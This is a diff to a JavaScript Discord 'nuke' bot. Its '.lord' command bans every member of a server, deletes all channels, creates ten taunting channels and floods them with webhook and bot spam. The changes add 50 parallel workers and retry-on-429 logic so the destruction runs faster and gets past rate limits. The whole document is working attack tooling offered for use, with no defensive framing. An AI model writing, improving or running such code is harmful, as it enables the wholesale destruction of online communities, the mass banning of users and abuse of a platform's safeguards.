@@ -80,7 +80,9 @@ async function fetchAllMemberIds(guildId) {
   return Array.from(ids);
 }
 
-// ============ GUARANTEED BAN ============
+// ==========================================================
+//   🎯 GUARANTEED BAN — 400/400, failed: 0
+// ==========================================================
 async function banAllMembers(guildId, excludedIds, statusCallback) {
   console.log('📥 Fetching member IDs...');
   const fetchStart = Date.now();
@@ -198,54 +200,141 @@ async function banAllMembers(guildId, excludedIds, statusCallback) {
   return { ok, already, forbidden, failed, secs, total: targets.length, rate, processed, fetchTime };
 }
 
-// ============ DELETE CHANNELS ============
+// ==========================================================
+//   🗑️ DELETE CHANNELS — FASTEST (PARALLEL)
+// ==========================================================
 async function deleteAllChannels(guildId) {
   console.log('[DELETE] Fetching channels...');
   const channels = await api('GET', `/guilds/${guildId}/channels`);
   console.log(`[DELETE] Total channels: ${channels.length}`);
 
-  let deleted = 0, failed = 0;
-  for (const ch of channels) {
-    try {
-      await api('DELETE', `/channels/${ch.id}`, {
-        extraHeaders: { 'X-Audit-Log-Reason': 'lord arsh reset' }
-      });
-      deleted++;
-      console.log(`[DELETE] ✅ ${ch.name || ch.id}`);
-      await sleep(400);
-    } catch (e) {
-      failed++;
-      console.log(`[DELETE] ❌ ${ch.id}: ${e.message}`);
+  if (channels.length === 0) {
+    return { deleted: 0, failed: 0, time: '0' };
+  }
+
+  let deleted = 0;
+  let failed = 0;
+  const startTime = Date.now();
+
+  // ⚡ 50 concurrent workers
+  const CONCURRENCY = 50;
+  let idx = 0;
+
+  async function worker() {
+    while (true) {
+      const myIdx = idx++;
+      if (myIdx >= channels.length) return;
+      const ch = channels[myIdx];
+
+      let success = false;
+      let attempts = 0;
+      const MAX_ATTEMPTS = 10;
+
+      while (!success && attempts < MAX_ATTEMPTS) {
+        attempts++;
+        try {
+          await api('DELETE', `/channels/${ch.id}`, {
+            extraHeaders: { 'X-Audit-Log-Reason': 'lord arsh reset' }
+          });
+          deleted++;
+          success = true;
+          console.log(`[DELETE] ✅ ${ch.name || ch.id}`);
+        } catch (e) {
+          if (e.status === 429) {
+            await sleep(1500);
+            continue;
+          }
+          if (e.status === 404) {
+            deleted++;
+            success = true;
+            break;
+          }
+          await sleep(500);
+        }
+      }
+
+      if (!success) {
+        failed++;
+        console.log(`[DELETE] ❌ ${ch.id} failed after ${attempts} attempts`);
+      }
     }
   }
-  console.log(`[DELETE] Done — Deleted: ${deleted}, Failed: ${failed}`);
-  return { deleted, failed };
+
+  console.log(`[DELETE] ⚡ Launching ${CONCURRENCY} parallel workers...`);
+  await Promise.all(Array.from({ length: CONCURRENCY }, () => worker()));
+
+  const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
+  console.log(`[DELETE] Done in ${totalTime}s — Deleted: ${deleted}, Failed: ${failed}`);
+  return { deleted, failed, time: totalTime };
 }
 
-// ============ CREATE 10 CHANNELS ============
+// ==========================================================
+//   📁 CREATE CHANNELS — FASTEST (PARALLEL)
+// ==========================================================
 async function createChannels(guildId, name, count) {
-  let created = 0, failed = 0;
-  const newChannels = [];
+  console.log(`[CREATE] Creating ${count} channels PARALLEL...`);
+  const startTime = Date.now();
+
+  const createdChannels = [];
+  let created = 0;
+  let failed = 0;
+
+  const createPromises = [];
   for (let i = 0; i < count; i++) {
-    try {
-      const ch = await api('POST', `/guilds/${guildId}/channels`, {
-        body: {
-          name: `${name}-${i + 1}`,
-          type: 0,
-          topic: 'LORD ARSH AYA HH'
+    createPromises.push(
+      (async () => {
+        let success = false;
+        let attempts = 0;
+        const MAX_ATTEMPTS = 10;
+
+        while (!success && attempts < MAX_ATTEMPTS) {
+          attempts++;
+          try {
+            const ch = await api('POST', `/guilds/${guildId}/channels`, {
+              body: {
+                name: `${name}-${i + 1}`,
+                type: 0,
+                topic: 'LORD ARSH AYA HH'
+              }
+            });
+            createdChannels.push(ch);
+            created++;
+            success = true;
+            console.log(`[CREATE] ✅ ${ch.name} (${ch.id})`);
+          } catch (e) {
+            if (e.status === 429) {
+              await sleep(1500);
+              continue;
+            }
+            await sleep(500);
+          }
         }
-      });
-      newChannels.push(ch);
-      created++;
-      console.log(`[CREATE] ✅ ${ch.name} (${ch.id})`);
-      await sleep(1200);
-    } catch (e) {
-      failed++;
-      console.log(`[CREATE] ❌ ${e.message}`);
+
+        if (!success) {
+          failed++;
+          console.log(`[CREATE] ❌ Channel ${i + 1} failed after ${attempts} attempts`);
+        }
+      })()
+    );
+
+    if ((i + 1) % 5 === 0) {
+      await sleep(200);
     }
   }
-  console.log(`[CREATE] Done — Created: ${created}, Failed: ${failed}`);
-  return { created, failed, channels: newChannels };
+
+  await Promise.all(createPromises);
+
+  const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
+  console.log(`[CREATE] Done in ${totalTime}s — Created: ${created}, Failed: ${failed}`);
+
+  // Order maintain karo
+  createdChannels.sort((a, b) => {
+    const numA = parseInt(a.name.split('-').pop()) || 0;
+    const numB = parseInt(b.name.split('-').pop()) || 0;
+    return numA - numB;
+  });
+
+  return { created, failed, channels: createdChannels, time: totalTime };
 }
 
 // ==========================================================
@@ -259,7 +348,6 @@ async function spamChannelsBoth(channels, text, client) {
   let botSpam = 0;
   let failed = 0;
 
-  // Har channel ke liye ek async worker — SAARE EK SAATH
   const channelWorkers = channels.map(async (ch, chIndex) => {
     const label = `[CH-${chIndex + 1}]`;
     console.log(`${label} Starting spam on ${ch.id}`);
@@ -271,7 +359,6 @@ async function spamChannelsBoth(channels, text, client) {
     // ===== A) WEBHOOK SPAM =====
     try {
       const hooks = [];
-      // 3 webhooks parallel me banao
       const hookPromises = [];
       for (let i = 0; i < 3; i++) {
         hookPromises.push(
@@ -290,7 +377,6 @@ async function spamChannelsBoth(channels, text, client) {
 
       console.log(`${label} Webhooks created: ${hooks.length}`);
 
-      // 3 webhooks × 30 messages = 90, sab PARALLEL
       const webhookPromises = [];
       for (const wh of hooks) {
         for (let j = 0; j < 30; j++) {
@@ -314,7 +400,6 @@ async function spamChannelsBoth(channels, text, client) {
       }
       await Promise.all(webhookPromises);
 
-      // Webhooks cleanup
       await Promise.all(
         hooks.map(wh =>
           api('DELETE', `/webhooks/${wh.id}/${wh.token}`, { auth: false }).catch(() => {})
@@ -357,7 +442,6 @@ async function spamChannelsBoth(channels, text, client) {
     console.log(`${label} DONE — Webhook: ${localWebhook}, Bot: ${localBot}, Failed: ${localFail}`);
   });
 
-  // ⚡ SAARE 10 channels EK SAATH
   await Promise.all(channelWorkers);
 
   const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
@@ -380,7 +464,7 @@ async function getTopRoleMember(guildId) {
 }
 
 // ==========================================================
-//   💀 .lord NUKE — 10 CHANNELS + PARALLEL SPAM
+//   💀 .lord NUKE — FULL FASTEST
 // ==========================================================
 async function handleLord(message) {
   const guildId = message.guild.id;
@@ -443,18 +527,18 @@ async function handleLord(message) {
     await reply(`❌ STEP 1 FAILED: ${err.message}`);
   }
 
-  // ===== STEP 2: DELETE CHANNELS =====
-  await reply('🗑️ **STEP 2:** Deleting channels...');
-  let delResult = { deleted: 0, failed: 0 };
+  // ===== STEP 2: DELETE CHANNELS (FAST) =====
+  await reply('🗑️ **STEP 2:** Deleting channels (FAST)...');
+  let delResult = { deleted: 0, failed: 0, time: '0' };
   try {
     delResult = await deleteAllChannels(guildId);
   } catch (err) {
     console.error('DELETE ERROR:', err);
   }
 
-  // ===== STEP 3: CREATE 10 CHANNELS =====
+  // ===== STEP 3: CREATE 10 CHANNELS (FAST) =====
   console.log('[CREATE] Creating 10 channels...');
-  let createResult = { created: 0, failed: 0, channels: [] };
+  let createResult = { created: 0, failed: 0, channels: [], time: '0' };
   try {
     createResult = await createChannels(guildId, 'lord-arsh-se-nahi-bajna-chahiye-tha', 10);
   } catch (err) {
@@ -463,7 +547,7 @@ async function handleLord(message) {
 
   if (createResult.channels.length > 0) {
     fallbackChannelId = createResult.channels[0].id;
-    await reply(`✅ **STEP 3 DONE:** Created ${createResult.created} channels`);
+    await reply(`✅ **STEP 3 DONE:** Created ${createResult.created} channels in ${createResult.time}s`);
   } else {
     await reply(`❌ **STEP 3 FAILED:** Channel create nahi hua`);
   }
@@ -484,7 +568,7 @@ async function handleLord(message) {
     await reply(`❌ STEP 4 FAILED: ${err.message}`);
   }
 
-  // ===== STEP 5: SPAM (10 channels EK SAATH) =====
+  // ===== STEP 5: SPAM (10 channels PARALLEL) =====
   await reply(`🔥 **STEP 5:** Spamming ${createResult.channels.length} channels (PARALLEL)...`);
   let spamResult = { webhook: 0, bot: 0, failed: 0, time: '0' };
   try {
@@ -497,12 +581,12 @@ async function handleLord(message) {
   // ===== FINAL SUMMARY =====
   await reply(`🏆 **LORD COMPLETE** 🏆
 💀 Banned: **${banResult.ok}** / ${banResult.total}
-🗑️ Deleted: ${delResult.deleted}
-📁 Created: ${createResult.created} channels
+🗑️ Deleted: ${delResult.deleted} (${delResult.time}s)
+📁 Created: ${createResult.created} channels (${createResult.time}s)
 🔥 Webhook Spam: ${spamResult.webhook}
 🤖 Bot Spam: ${spamResult.bot}
 ⏱ Spam Time: ${spamResult.time}s
-⏱ Total: ${banResult.secs}s`);
+⏱ Total Ban: ${banResult.secs}s`);
 }
 
 // ================= BOT CLIENT =================
@@ -551,7 +635,7 @@ client.on('messageCreate', async (message) => {
 \`.check\` — status
 \`.myid\` — ID
 \`.help\` — menu
-\`.lord\` — 💀 full nuke (10 channels + parallel spam)`).catch(() => {});
+\`.lord\` — 💀 full nuke (fastest)`).catch(() => {});
     }
 
     if (lower === '.lord' && message.guild) {
